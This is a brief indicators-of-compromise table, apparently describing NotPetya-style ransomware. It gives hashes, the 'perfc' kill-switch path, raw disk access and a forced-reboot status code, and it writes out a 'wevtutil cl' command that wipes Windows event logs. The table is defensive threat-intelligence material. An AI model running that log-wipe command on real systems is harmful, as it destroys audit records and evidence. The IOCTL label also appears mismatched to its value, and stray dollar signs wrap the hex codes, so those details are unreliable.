| **Indicator** | **Value** |
| --- | --- |
| **MD5** | `71b6a493388e7d0b40c83ce903bc6b04` |
| **SHA256** | `027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745` |
| **Export Name** | `perfc` (ordinal 1) |
| **Kill-switch** | File existence check before payload (typically `C:\Windows\perfc`) |
| **Embedded RSA Pubkey** | `MIIBCgKCAQEAxP/Vq...AQAB` |
| **Raw Disk Access** | `\\.\C:` with IOCTL `$0x70000$` (`IOCTL_DISK_GET_DRIVE_LAYOUT`) |
| **Log Wipe Command** | `wevtutil cl Setup/System/Security/Application` |
| **Hardcoded Timeout** | 60 min default sweep |
| **Reboot NTSTATUS** | `$0xC0000350$` (`NtRaiseHardError`) |